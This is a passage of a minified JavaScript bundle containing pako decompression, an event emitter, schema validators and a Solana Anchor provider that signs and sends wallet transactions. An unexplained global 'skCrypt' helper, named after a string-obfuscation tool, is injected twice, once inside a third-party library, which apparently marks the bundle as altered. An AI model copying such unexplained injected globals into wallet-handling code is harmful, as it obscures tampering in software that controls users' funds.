                (t.avail_in = a),
                (n.hold = c),
                (n.bits = l),
                sd(t, f),
                (s = t.next_out),
                (o = t.output),
                (u = t.avail_out),
                (i = t.next_in),
                (r = t.input),
                (a = t.avail_in),
                (c = n.hold),
                (l = n.bits),
                n.mode === Td && (n.back = -1);
              break;
            }
            for (
              n.back = 0;
              (S = n.lencode[c & ((1 << n.lenbits) - 1)]),
                (g = S >>> 24),
                (y = (S >>> 16) & 255),
                (w = 65535 & S),
                !(g <= l);

            ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (y && !(240 & y)) {
              for (
                b = g, v = y, A = w;
                (S = n.lencode[A + ((c & ((1 << (b + v)) - 1)) >> b)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(b + g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (c >>>= b), (l -= b), (n.back += b);
            }
            if (
              ((c >>>= g), (l -= g), (n.back += g), (n.length = w), 0 === y)
            ) {
              n.mode = 16205;
              break;
            }
            if (32 & y) {
              (n.back = -1), (n.mode = Td);
              break;
            }
            if (64 & y) {
              (t.msg = "invalid literal/length code"), (n.mode = Od);
              break;
            }
            (n.extra = 15 & y), (n.mode = 16201);
          case 16201:
            if (n.extra) {
              for (B = n.extra; l < B; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.length += c & ((1 << n.extra) - 1)),
                (c >>>= n.extra),
                (l -= n.extra),
                (n.back += n.extra);
            }
            (n.was = n.length), (n.mode = 16202);
          case 16202:
            for (
              ;
              (S = n.distcode[c & ((1 << n.distbits) - 1)]),
                (g = S >>> 24),
                (y = (S >>> 16) & 255),
                (w = 65535 & S),
                !(g <= l);

            ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (!(240 & y)) {
              for (
                b = g, v = y, A = w;
                (S = n.distcode[A + ((c & ((1 << (b + v)) - 1)) >> b)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(b + g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (c >>>= b), (l -= b), (n.back += b);
            }
            if (((c >>>= g), (l -= g), (n.back += g), 64 & y)) {
              (t.msg = "invalid distance code"), (n.mode = Od);
              break;
            }
            (n.offset = w), (n.extra = 15 & y), (n.mode = 16203);
          case 16203:
            if (n.extra) {
              for (B = n.extra; l < B; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.offset += c & ((1 << n.extra) - 1)),
                (c >>>= n.extra),
                (l -= n.extra),
                (n.back += n.extra);
            }
            if (n.offset > n.dmax) {
              (t.msg = "invalid distance too far back"), (n.mode = Od);
              break;
            }
            n.mode = 16204;
          case 16204:
            if (0 === u) break t;
            if (((h = f - u), n.offset > h)) {
              if (((h = n.offset - h), h > n.whave && n.sane)) {
                (t.msg = "invalid distance too far back"), (n.mode = Od);
                break;
              }
              h > n.wnext
                ? ((h -= n.wnext), (p = n.wsize - h))
                : (p = n.wnext - h),
                h > n.length && (h = n.length),
                (m = n.window);
            } else (m = o), (p = s - n.offset), (h = n.length);
            h > u && (h = u), (u -= h), (n.length -= h);
            do {
              o[s++] = m[p++];
            } while (--h);
            0 === n.length && (n.mode = xd);
            break;
          case 16205:
            if (0 === u) break t;
            (o[s++] = n.length), u--, (n.mode = xd);
            break;
          case Pd:
            if (n.wrap) {
              for (; l < 32; ) {
                if (0 === a) break t;
                a--, (c |= r[i++] << l), (l += 8);
              }
              if (
                ((f -= u),
                (t.total_out += f),
                (n.total += f),
                4 & n.wrap &&
                  f &&
                  (t.adler = n.check =
                    n.flags
                      ? Hl(n.check, o, f, s - f)
                      : Gl(n.check, o, f, s - f)),
                (f = u),
                4 & n.wrap && (n.flags ? c : Rd(c)) !== n.check)
              ) {
                (t.msg = "incorrect data check"), (n.mode = Od);
                break;
              }
              (c = 0), (l = 0);
            }
            n.mode = 16207;
          case 16207:
            if (n.wrap && n.flags) {
              for (; l < 32; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (4 & n.wrap && c !== (4294967295 & n.total)) {
                (t.msg = "incorrect length check"), (n.mode = Od);
                break;
              }
              (c = 0), (l = 0);
            }
            n.mode = 16208;
          case 16208:
            I = yd;
            break t;
          case Od:
            I = vd;
            break t;
          case 16210:
            return Ad;
          default:
            return bd;
        }
      return (
        (t.next_out = s),
        (t.avail_out = u),
        (t.next_in = i),
        (t.avail_in = a),
        (n.hold = c),
        (n.bits = l),
        (n.wsize ||
          (f !== t.avail_out && n.mode < Od && (n.mode < Pd || e !== hd))) &&
          jd(t, t.output, t.next_out, f - t.avail_out),
        (d -= t.avail_in),
        (f -= t.avail_out),
        (t.total_in += d),
        (t.total_out += f),
        (n.total += f),
        4 & n.wrap &&
          f &&
          (t.adler = n.check =
            n.flags
              ? Hl(n.check, o, f, t.next_out - f)
              : Gl(n.check, o, f, t.next_out - f)),
        (t.data_type =
          n.bits +
          (n.last ? 64 : 0) +
          (n.mode === Td ? 128 : 0) +
          (n.mode === Ed || n.mode === Cd ? 256 : 0)),
        ((0 === d && 0 === f) || e === hd) && I === gd && (I = kd),
        I
      );
    },
    Vd = {
      inflateReset: Dd,
      inflateReset2: Ud,
      inflateResetKeep: Nd,
      inflateInit: (t) => qd(t, 15),
      inflateInit2: qd,
      inflate: Gd,
      inflateEnd: (t) => {
        if (Ld(t)) return bd;
        let e = t.state;
        return e.window && (e.window = null), (t.state = null), gd;
      },
      inflateGetHeader: (t, e) => {
        if (Ld(t)) return bd;
        const n = t.state;
        return 2 & n.wrap ? ((n.head = e), (e.done = !1), gd) : bd;
      },
      inflateSetDictionary: (t, e) => {
        const n = e.length;
        let r, o, i;
        return Ld(t)
          ? bd
          : ((r = t.state),
            0 !== r.wrap && r.mode !== _d
              ? bd
              : r.mode === _d && ((o = 1), (o = Gl(o, e, n, 0)), o !== r.check)
              ? vd
              : ((i = jd(t, e, n, n)),
                i ? ((r.mode = 16210), Ad) : ((r.havedict = 1), gd)));
      },
      inflateInfo: "pako inflate (from Nodeca project)",
    };
  var Hd = function () {
    (this.text = 0),
      (this.time = 0),
      (this.xflags = 0),
      (this.os = 0),
      (this.extra = null),
      (this.extra_len = 0),
      (this.name = ""),
      (this.comment = ""),
      (this.hcrc = 0),
      (this.done = !1);
  };
  const Zd = Object.prototype.toString,
    {
      Z_NO_FLUSH: Xd,
      Z_FINISH: Jd,
      Z_OK: Yd,
      Z_STREAM_END: Qd,
      Z_NEED_DICT: $d,
      Z_STREAM_ERROR: tf,
      Z_DATA_ERROR: ef,
      Z_MEM_ERROR: nf,
    } = Xl;
  function rf(t) {
    this.options = Yl({ chunkSize: 65536, windowBits: 15, to: "" }, t || {});
    const e = this.options;
    e.raw &&
      e.windowBits >= 0 &&
      e.windowBits < 16 &&
      ((e.windowBits = -e.windowBits),
      0 === e.windowBits && (e.windowBits = -15)),
      !(e.windowBits >= 0 && e.windowBits < 16) ||
        (t && t.windowBits) ||
        (e.windowBits += 32),
      e.windowBits > 15 &&
        e.windowBits < 48 &&
        (15 & e.windowBits || (e.windowBits |= 15)),
      (this.err = 0),
      (this.msg = ""),
      (this.ended = !1),
      (this.chunks = []),
      (this.strm = new od()),
      (this.strm.avail_out = 0);
    let n = Vd.inflateInit2(this.strm, e.windowBits);
    if (n !== Yd) throw new Error(Zl[n]);
    if (
      ((this.header = new Hd()),
      Vd.inflateGetHeader(this.strm, this.header),
      e.dictionary &&
        ("string" == typeof e.dictionary
          ? (e.dictionary = ed(e.dictionary))
          : "[object ArrayBuffer]" === Zd.call(e.dictionary) &&
            (e.dictionary = new Uint8Array(e.dictionary)),
        e.raw &&
          ((n = Vd.inflateSetDictionary(this.strm, e.dictionary)), n !== Yd)))
    )
      throw new Error(Zl[n]);
  }
  (rf.prototype.push = function (t, e) {
    const n = this.strm,
      r = this.options.chunkSize,
      o = this.options.dictionary;
    let i, s, a;
    if (this.ended) return !1;
    for (
      s = e === ~~e ? e : !0 === e ? Jd : Xd,
        "[object ArrayBuffer]" === Zd.call(t)
          ? (n.input = new Uint8Array(t))
          : (n.input = t),
        n.next_in = 0,
        n.avail_in = n.input.length;
      ;

    ) {
      for (
        0 === n.avail_out &&
          ((n.output = new Uint8Array(r)), (n.next_out = 0), (n.avail_out = r)),
          i = Vd.inflate(n, s),
          i === $d &&
            o &&
            ((i = Vd.inflateSetDictionary(n, o)),
            i === Yd ? (i = Vd.inflate(n, s)) : i === ef && (i = $d));
        n.avail_in > 0 && i === Qd && n.state.wrap > 0 && 0 !== t[n.next_in];

      )
        Vd.inflateReset(n), (i = Vd.inflate(n, s));
      switch (i) {
        case tf:
        case ef:
        case $d:
        case nf:
          return this.onEnd(i), (this.ended = !0), !1;
      }
      if (((a = n.avail_out), n.next_out && (0 === n.avail_out || i === Qd)))
        if ("string" === this.options.to) {
          let t = rd(n.output, n.next_out),
            e = n.next_out - t,
            o = nd(n.output, t);
          (n.next_out = e),
            (n.avail_out = r - e),
            e && n.output.set(n.output.subarray(t, t + e), 0),
            this.onData(o);
        } else
          this.onData(
            n.output.length === n.next_out
              ? n.output
              : n.output.subarray(0, n.next_out)
          );
      if (i !== Yd || 0 !== a) {
        if (i === Qd)
          return (
            (i = Vd.inflateEnd(this.strm)), this.onEnd(i), (this.ended = !0), !0
          );
        if (0 === n.avail_in) break;
      }
    }
    return !0;
  }),
    (rf.prototype.onData = function (t) {
      this.chunks.push(t);
    }),
    (rf.prototype.onEnd = function (t) {
      t === Yd &&
        ("string" === this.options.to
          ? (this.result = this.chunks.join(""))
          : (this.result = Ql(this.chunks))),
        (this.chunks = []),
        (this.err = t),
        (this.msg = this.strm.msg);
    });
  var of = {
    inflate: function (t, e) {
      const n = new rf(e);
      if ((n.push(t), n.err)) throw n.msg || Zl[n.err];
      return n.result;
    },
  };
  const { inflate: sf } = of;
  var af,
    uf = sf,
    cf = { exports: {} };
  var lf =
    (af ||
      ((af = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e = Object.prototype.hasOwnProperty,
          n = "~";
        function r() {}
        function o(t, e, n) {
          (this.fn = t), (this.context = e), (this.once = n || !1);
        }
        function i(t, e, r, i, s) {
          if ("function" != typeof r)
            throw new TypeError("The listener must be a function");
          var a = new o(r, i || t, s),
            u = n ? n + e : e;
          return (
            t._events[u]
              ? t._events[u].fn
                ? (t._events[u] = [t._events[u], a])
                : t._events[u].push(a)
              : ((t._events[u] = a), t._eventsCount++),
            t
          );
        }
        function s(t, e) {
          0 === --t._eventsCount ? (t._events = new r()) : delete t._events[e];
        }
        function a() {
          (this._events = new r()), (this._eventsCount = 0);
        }
        Object.create &&
          ((r.prototype = Object.create(null)), new r().__proto__ || (n = !1)),
          (a.prototype.eventNames = function () {
            var t,
              r,
              o = [];
            if (0 === this._eventsCount) return o;
            for (r in (t = this._events))
              e.call(t, r) && o.push(n ? r.slice(1) : r);
            return Object.getOwnPropertySymbols
              ? o.concat(Object.getOwnPropertySymbols(t))
              : o;
          }),
          (a.prototype.listeners = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            if (!r) return [];
            if (r.fn) return [r.fn];
            for (var o = 0, i = r.length, s = new Array(i); o < i; o++)
              s[o] = r[o].fn;
            return s;
          }),
          (a.prototype.listenerCount = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            return r ? (r.fn ? 1 : r.length) : 0;
          }),
          (a.prototype.emit = function (t, e, r, o, i, s) {
            var a = n ? n + t : t;
            if (!this._events[a]) return !1;
            var u,
              c,
              l = this._events[a],
              d = arguments.length;
            if (l.fn) {
              switch ((l.once && this.removeListener(t, l.fn, void 0, !0), d)) {
                case 1:
                  return l.fn.call(l.context), !0;
                case 2:
                  return l.fn.call(l.context, e), !0;
                case 3:
                  return l.fn.call(l.context, e, r), !0;
                case 4:
                  return l.fn.call(l.context, e, r, o), !0;
                case 5:
                  return l.fn.call(l.context, e, r, o, i), !0;
                case 6:
                  return l.fn.call(l.context, e, r, o, i, s), !0;
              }
              for (c = 1, u = new Array(d - 1); c < d; c++)
                u[c - 1] = arguments[c];
              l.fn.apply(l.context, u);
            } else {
              var f,
                h = l.length;
              for (c = 0; c < h; c++)
                switch (
                  (l[c].once && this.removeListener(t, l[c].fn, void 0, !0), d)
                ) {
                  case 1:
                    l[c].fn.call(l[c].context);
                    break;
                  case 2:
                    l[c].fn.call(l[c].context, e);
                    break;
                  case 3:
                    l[c].fn.call(l[c].context, e, r);
                    break;
                  case 4:
                    l[c].fn.call(l[c].context, e, r, o);
                    break;
                  default:
                    if (!u)
                      for (f = 1, u = new Array(d - 1); f < d; f++)
                        u[f - 1] = arguments[f];
                    l[c].fn.apply(l[c].context, u);
                }
            }
            return !0;
          }),
          (a.prototype.on = function (t, e, n) {
            return i(this, t, e, n, !1);
          }),
          (a.prototype.once = function (t, e, n) {
            return i(this, t, e, n, !0);
          }),
          (a.prototype.removeListener = function (t, e, r, o) {
            var i = n ? n + t : t;
            if (!this._events[i]) return this;
            if (!e) return s(this, i), this;
            var a = this._events[i];
            if (a.fn)
              a.fn !== e ||
                (o && !a.once) ||
                (r && a.context !== r) ||
                s(this, i);
            else {
              for (var u = 0, c = [], l = a.length; u < l; u++)
                (a[u].fn !== e ||
                  (o && !a[u].once) ||
                  (r && a[u].context !== r)) &&
                  c.push(a[u]);
              c.length
                ? (this._events[i] = 1 === c.length ? c[0] : c)
                : s(this, i);
            }
            return this;
          }),
          (a.prototype.removeAllListeners = function (t) {
            var e;
            return (
              t
                ? ((e = n ? n + t : t), this._events[e] && s(this, e))
                : ((this._events = new r()), (this._eventsCount = 0)),
              this
            );
          }),
          (a.prototype.off = a.prototype.removeListener),
          (a.prototype.addListener = a.prototype.on),
          (a.prefixed = n),
          (a.EventEmitter = a),
          (t.exports = a);
      })(cf)),
    cf.exports);
  const df = zn(lf);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ff = (t) => "version" in t;
  function hf(t) {
    return Ol.encode(t);
  }
  function pf(t) {
    return ft.from(t, "base64");
  }
  function mf(t) {
    return "accounts" in t;
  }
  const gf = Fl.struct([Fl.publicKey("authority"), Fl.vecU8("data")]);
  function yf(t, e, n, r) {
    return (null == t ? void 0 : t.length) ? (t[0].name ? n(t) : r(t)) : e();
  }
  function wf(t, ...e) {
    if (t.args.length != e.length) throw new Error("Invalid argument length");
    const n = {};
    let r = 0;
    return (
      t.args.forEach((t) => {
        (n[t.name] = e[r]), (r += 1);
      }),
      n
    );
  }
  function bf(t, e = {}) {
    t.forEach((t) => {
      if (mf(t)) bf(t.accounts, e[t.name]);
      else if (!e[t.name])
        throw new Error(`Account \`${t.name}\` not provided.`);
    });
  }
  function vf(t) {
    return t instanceof Ji ? t : new Ji(t);
  }
  class Af extends TypeError {
    constructor(t, e) {
      let n;
      const { message: r, ...o } = t,
        { path: i } = t;
      super(0 === i.length ? r : "At path: " + i.join(".") + " -- " + r),
        (this.value = void 0),
        (this.key = void 0),
        (this.type = void 0),
        (this.refinement = void 0),
        (this.path = void 0),
        (this.branch = void 0),
        (this.failures = void 0),
        Object.assign(this, o),
        (this.name = this.constructor.name),
        (this.failures = () => {
          var r;
          return null != (r = n) ? r : (n = [t, ...e()]);
        });
    }
  }
  function kf(t) {
    return "object" == typeof t && null != t;
  }
  function If(t) {
    return "string" == typeof t ? JSON.stringify(t) : "" + t;
  }
  function Sf(t, e, n, r) {
    if (!0 === t) return;
    !1 === t ? (t = {}) : "string" == typeof t && (t = { message: t });
    const { path: o, branch: i } = e,
      { type: s } = n,
      {
        refinement: a,
        message: u = "Expected a value of type `" +
          s +
          "`" +
          (a ? " with refinement `" + a + "`" : "") +
          ", but received: `" +
          If(r) +
          "`",
      } = t;
    return {
      value: r,
      type: s,
      refinement: a,
      key: o[o.length - 1],
      path: o,
      branch: i,
      ...t,
      message: u,
    };
  }
  function* _f(t, e, n, r) {
    var o;
    (kf((o = t)) && "function" == typeof o[Symbol.iterator]) || (t = [t]);
    for (const i of t) {
      const t = Sf(i, e, n, r);
      t && (yield t);
    }
  }
  function* Tf(t, e, n) {
    void 0 === n && (n = {});
    const { path: r = [], branch: o = [t], coerce: i = !1, mask: s = !1 } = n,
      a = { path: r, branch: o };
    if (
      i &&
      ((t = e.coercer(t, a)),
      s && "type" !== e.type && kf(e.schema) && kf(t) && !Array.isArray(t))
    )
      for (const c in t) void 0 === e.schema[c] && delete t[c];
    let u = !0;
    for (const c of e.validator(t, a)) (u = !1), yield [c, void 0];
    for (let [c, l, d] of e.entries(t, a)) {
      const e = Tf(l, d, {
        path: void 0 === c ? r : [...r, c],
        branch: void 0 === c ? o : [...o, l],
        coerce: i,
        mask: s,
      });
      for (const n of e)
        n[0]
          ? ((u = !1), yield [n[0], void 0])
          : i &&
            ((l = n[1]),
            void 0 === c
              ? (t = l)
              : t instanceof Map
              ? t.set(c, l)
              : t instanceof Set
              ? t.add(l)
              : kf(t) && (t[c] = l));
    }
    if (u) for (const c of e.refiner(t, a)) (u = !1), yield [c, void 0];
    u && (yield [void 0, t]);
  }
  class Bf {
    constructor(t) {
      (this.TYPE = void 0),
        (this.type = void 0),
        (this.schema = void 0),
        (this.coercer = void 0),
        (this.validator = void 0),
        (this.refiner = void 0),
        (this.entries = void 0);
      const {
        type: e,
        schema: n,
        validator: r,
        refiner: o,
        coercer: i = (t) => t,
        entries: s = function* () {},
      } = t;
      (this.type = e),
        (this.schema = n),
        (this.entries = s),
        (this.coercer = i),
        (this.validator = r ? (t, e) => _f(r(t, e), e, this, t) : () => []),
        (this.refiner = o ? (t, e) => _f(o(t, e), e, this, t) : () => []);
    }
    assert(t) {
      return (function (t, e) {
        const n = xf(t, e);
        if (n[0]) throw n[0];
      })(t, this);
    }
    create(t) {
      return Cf(t, this);
    }
    is(t) {
      return Ef(t, this);
    }
    mask(t) {
      return (function (t, e) {
        const n = xf(t, e, { coerce: !0, mask: !0 });
        if (n[0]) throw n[0];
        return n[1];
      })(t, this);
    }
    validate(t, e) {
      return void 0 === e && (e = {}), xf(t, this, e);
    }
  }
  function Cf(t, e) {
    const n = xf(t, e, { coerce: !0 });
    if (n[0]) throw n[0];
    return n[1];
  }
  function Ef(t, e) {
    return !xf(t, e)[0];
  }
  function xf(t, e, n) {
    void 0 === n && (n = {});
    const r = Tf(t, e, n),
      o = (function (t) {
        const { done: e, value: n } = t.next();
        return e ? void 0 : n;
      })(r);
    if (o[0]) {
      return [
        new Af(o[0], function* () {
          for (const t of r) t[0] && (yield t[0]);
        }),
        void 0,
      ];
    }
    return [void 0, o[1]];
  }
  function Pf(t, e) {
    return new Bf({ type: t, schema: null, validator: e });
  }
  function Of(t) {
    return new Bf({
      type: "array",
      schema: t,
      *entries(e) {
        if (t && Array.isArray(e))
          for (const [n, r] of e.entries()) yield [n, r, t];
      },
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
      validator: (t) =>
        Array.isArray(t) || "Expected an array value, but received: " + If(t),
    });
  }
  function Rf(t) {
    const e = If(t);
    return new Bf({
      type: "literal",
      schema: t,
      validator: (n) =>
        n === t || "Expected the literal `" + e + "`, but received: " + If(n),
    });
  }
  function Mf(t) {
    return new Bf({
      ...t,
      validator: (e, n) => null === e || t.validator(e, n),
      refiner: (e, n) => null === e || t.refiner(e, n),
    });
  }
  function Lf() {
    return Pf(
      "number",
      (t) =>
        ("number" == typeof t && !isNaN(t)) ||
        "Expected a number, but received: " + If(t)
    );
  }
  function Nf(t) {
    return new Bf({
      ...t,
      validator: (e, n) => void 0 === e || t.validator(e, n),
      refiner: (e, n) => void 0 === e || t.refiner(e, n),
    });
  }
  function Df() {
    return Pf(
      "string",
      (t) => "string" == typeof t || "Expected a string, but received: " + If(t)
    );
  }
  function Uf(t) {
    const e = Object.keys(t);
    return new Bf({
      type: "type",
      schema: t,
      *entries(n) {
        if (kf(n)) for (const r of e) yield [r, n[r], t[r]];
      },
      validator: (t) => kf(t) || "Expected an object, but received: " + If(t),
    });
  }
  function qf(t) {
    const e = t.map((t) => t.type).join(" | ");
    return new Bf({
      type: "union",
      schema: null,
      coercer: (e, n) =>
        (
          t.find((t) => {
            const [n] = t.validate(e, { coerce: !0 });
            return !n;
          }) || zf()
        ).coercer(e, n),
      validator(n, r) {
        const o = [];
        for (const e of t) {
          const [...t] = Tf(n, e, r),
            [i] = t;
          if (!i[0]) return [];
          for (const [e] of t) e && o.push(e);
        }
        return [
          "Expected the value to satisfy a union of `" +
            e +
            "`, but received: " +
            If(n),
          ...o,
        ];
      },
    });
  }
  function zf() {
    return Pf("unknown", () => !0);
  }
  async function Kf(t, e, n) {
    if (e.length <= 99) return await Wf(t, e, n);
    {
      const i =
        ((r = e),
        (o = 99),
        Array.apply(0, new Array(Math.ceil(r.length / o))).map((t, e) =>
          r.slice(e * o, (e + 1) * o)
        ));
      return (await Promise.all(i.map((e) => Wf(t, e, n)))).flat();
    }
    var r, o;
  }
  async function Wf(t, e, n) {
    const r = null != n ? n : t.commitment,
      { value: o, context: i } = await t.getMultipleAccountsInfoAndContext(
        e,
        r
      );
    return o.map((t, n) =>
      null === t ? null : { publicKey: e[n], account: t, context: i }
    );
  }
  function Ff(t) {
    return (
      (e = Gf(t)),
      (n = jf),
      (r = (e) => ("error" in e ? e : { ...e, result: Cf(e.result, t) })),
      new Bf({
        ...e,
        coercer: (t, o) => (Ef(t, n) ? e.coercer(r(t, o), o) : e.coercer(t, o)),
      })
    );
    var e, n, r;
  }
  const jf = Gf(zf());
  function Gf(t) {
    return qf([
      Uf({ jsonrpc: Rf("2.0"), id: Df(), result: t }),
      Uf({
        jsonrpc: Rf("2.0"),
        id: Df(),
        error: Uf({ code: zf(), message: Df(), data: Nf(Pf("any", () => !0)) }),
      }),
    ]);
  }
  const Vf =
    ((Hf = Uf({
      err: Mf(qf([Uf({}), Df()])),
      logs: Mf(Of(Df())),
      accounts: Nf(
        Mf(
          Of(
            Mf(
              Uf({
                executable: Pf("boolean", (t) => "boolean" == typeof t),
                owner: Df(),
                lamports: Lf(),
                data: Of(Df()),
                rentEpoch: Nf(Lf()),
              })
            )
          )
        )
      ),
      unitsConsumed: Nf(Lf()),
    })),
    Ff(Uf({ context: Uf({ slot: Lf() }), value: Hf })));
  var Hf;
  class Zf {
    constructor(t, e, n = Zf.defaultOptions()) {
      (this.connection = t),
        (this.wallet = e),
        (this.opts = n),
        (this.publicKey = null == e ? void 0 : e.publicKey);
    }
    static defaultOptions() {
      return { preflightCommitment: "processed", commitment: "processed" };
    }
    static local(t, e = Zf.defaultOptions()) {
      throw new Error("Provider local is not available on browser.");
    }
    static env() {
      throw new Error("Provider env is not available on browser.");
    }
    async sendAndConfirm(t, e, n) {
      var r, o, i, s;
      if ((void 0 === n && (n = this.opts), ff(t))) e && t.sign(e);
      else if (
        ((t.feePayer =
          null !== (r = t.feePayer) && void 0 !== r
            ? r
            : this.wallet.publicKey),
        (t.recentBlockhash = (
          await this.connection.getLatestBlockhash(n.preflightCommitment)
        ).blockhash),
        e)
      )
        for (const c of e) t.partialSign(c);
      const a = (t = await this.wallet.signTransaction(t)).serialize();
      try {
        return await Jf(this.connection, a, n);
      } catch (u) {
        if (u instanceof Yf) {
          const e = hf(
              ff(t)
                ? (null === (o = t.signatures) || void 0 === o
                    ? void 0
                    : o[0]) || new Uint8Array()
                : null !== (i = t.signature) && void 0 !== i
                ? i
                : new Uint8Array()
            ),
            n = ff(t) ? 0 : void 0,
            r = await this.connection.getTransaction(e, {
              commitment: "confirmed",
              maxSupportedTransactionVersion: n,
            });
          if (r) {
            const t =
              null === (s = r.meta) || void 0 === s ? void 0 : s.logMessages;
            throw t ? new Rs(u.message, t) : u;
          }
          throw u;
        }
        throw u;
      }
    }
    async sendAll(t, e) {
      var n, r, o;
      void 0 === e && (e = this.opts);
      const i = (
        await this.connection.getLatestBlockhash(e.preflightCommitment)
      ).blockhash;
      let s = t.map((t) => {
        var e, n;
        if (ff(t.tx)) {
          let e = t.tx;
          return t.signers && e.sign(t.signers), e;
        }
        {
          let r = t.tx,
            o = null !== (e = t.signers) && void 0 !== e ? e : [];
          return (
            (r.feePayer =
              null !== (n = r.feePayer) && void 0 !== n
                ? n
                : this.wallet.publicKey),
            (r.recentBlockhash = i),
            o.forEach((t) => {
              r.partialSign(t);
            }),
            r
          );
        }
      });
      const a = await this.wallet.signAllTransactions(s),
        u = [];
      for (let l = 0; l < s.length; l += 1) {
        const t = a[l],
          i = t.serialize();
        try {
          u.push(await Jf(this.connection, i, e));
        } catch (c) {
          if (c instanceof Yf) {
            const e = hf(
                ff(t)
                  ? (null === (n = t.signatures) || void 0 === n
                      ? void 0
                      : n[0]) || new Uint8Array()
                  : null !== (r = t.signature) && void 0 !== r
                  ? r
                  : new Uint8Array()
              ),
              i = ff(t) ? 0 : void 0,
              s = await this.connection.getTransaction(e, {
                commitment: "confirmed",
                maxSupportedTransactionVersion: i,
              });
            if (s) {
              const t =
                null === (o = s.meta) || void 0 === o ? void 0 : o.logMessages;
              throw t ? new Rs(c.message, t) : c;
            }
            throw c;
          }
          throw c;
        }
      }
      return u;
    }
    async simulate(t, e, n, r) {
      let o,
        i = (
          await this.connection.getLatestBlockhash(
            null != n ? n : this.connection.commitment
          )
        ).blockhash;
      if (
        (ff(t)
          ? (e &&
              e.length > 0 &&
              (t.sign(e), (t = await this.wallet.signTransaction(t))),
            (o = await this.connection.simulateTransaction(t, {
              commitment: n,
            })))
          : ((t.feePayer = t.feePayer || this.wallet.publicKey),
            (t.recentBlockhash = i),
            e && e.length > 0 && (t = await this.wallet.signTransaction(t)),
            (o = await (async function (t, e, n, r, o) {
              var i;
              n && n.length > 0 && e.sign(...n);
              const s = e._compile(),
                a = s.serialize(),
                u = e._serialize(a).toString("base64"),
                c = {
                  encoding: "base64",
                  commitment: null != r ? r : t.commitment,
                };
              if (o) {
                const t = (Array.isArray(o) ? o : s.nonProgramIds()).map((t) =>
                  t.toBase58()
                );
                c.accounts = { encoding: "base64", addresses: t };
              }
              n && n.length > 0 && (c.sigVerify = !0);
              const l = [u, c],
                d = Cf(await t._rpcRequest("simulateTransaction", l), Vf);
              if ("error" in d) {
                let t;
                if (
                  "data" in d.error &&
                  ((t =
                    null === (i = d.error.data) || void 0 === i
                      ? void 0
                      : i.logs),
                  t && Array.isArray(t))
                ) {
                  const e = "\n    ";
                  t.join(e);
                }
                throw new Rs(
                  "failed to simulate transaction: " + d.error.message,
                  t
                );
              }
              return d.result;
            })(this.connection, t, e, n, r))),
        o.value.err)
      )
        throw new Xf(o.value);
      return o.value;
    }
  }
  class Xf extends Error {
    constructor(t, e) {
      super(e), (this.simulationResponse = t);
    }
  }
  async function Jf(t, e, n) {
    const r = n
      ? {
          skipPreflight: n.skipPreflight,
          preflightCommitment: n.preflightCommitment || n.commitment,
          maxRetries: n.maxRetries,
          minContextSlot: n.minContextSlot,
        }
      : {};
    let o;
    const i = Date.now();
    for (; Date.now() - i < 6e4; )
      try {
        const i = await t.sendRawTransaction(e, r);
        if (null == n ? void 0 : n.blockhash)
          if (0 === r.maxRetries) {
            const e = AbortSignal.timeout(15e3);
            o = (
              await t.confirmTransaction(
                { abortSignal: e, signature: i, ...n.blockhash },
                n && n.commitment
              )
            ).value;
          } else
            o = (
              await t.confirmTransaction(
                { signature: i, ...n.blockhash },
                n && n.commitment
              )
            ).value;
        else o = (await t.confirmTransaction(i, n && n.commitment)).value;
        if (o.err)
          throw new Yf(`Raw transaction ${i} failed (${JSON.stringify(o)})`);
        return i;
      } catch (s) {
        if ("TimeoutError" === s.name) continue;
        throw s;
      }
    throw Error("Transaction failed to confirm in 60s");
  }
  class Yf extends Error {
    constructor(t) {
      super(t);
    }
  }
  function Qf() {
    return Zf.local();
  }
  var $f =
      "undefined" != typeof globalThis
        ? globalThis
        : "undefined" != typeof window
        ? window
        : void 0 !== Tl
        ? Tl
        : "undefined" != typeof self
        ? self
        : {},
    th = {};
  Object.defineProperty(th, "__esModule", { value: !0 });
  var eh =
      (th.ANCHOR_ERROR__REQUIRE_EQ_VIOLATED =
      th.ANCHOR_ERROR__REQUIRE_VIOLATED =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_PROGRAM_ID =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION_DELEGATE =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_METADATA_ADDRESS =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_MEMBER_ADDRESS =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_AUTHORITY =
      th.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION =
